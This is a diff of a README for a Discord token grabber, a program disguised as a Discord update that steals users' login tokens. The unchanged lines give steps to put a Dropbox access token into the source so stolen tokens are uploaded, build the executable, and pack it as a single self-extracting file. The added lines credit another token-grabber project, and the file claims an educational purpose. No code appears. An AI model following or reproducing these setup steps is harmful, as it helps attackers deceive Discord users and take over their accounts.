@@ -11,6 +11,10 @@ The program looks like a Discord Update, but it actually gets the tokens from th
  4. Generate a new Dropbox access token and paste it in the project to Grabbing.cs line 25. (string DropboxToken)
  5. Build your app and you are ready. (**The generated .dll files with the executable are necessary. You may want to make a self extractor executable, if you want it to be only an .exe file. You may also want to "Restore NuGet packages." in Visual Studio.**)
 
+**Huge thanks to:**
+[NYAN CAT](https://github.com/NYAN-x-CAT/Discord-Token-Grabber) +rep 🍺
+iLinked +rep 🍺 (R.I.P GitHub profile 😢)
+
 **I am not responsible for anything you are doing with this project. I made this project for educational purposes.**
 
 *This project is licensed under the MIT License.*
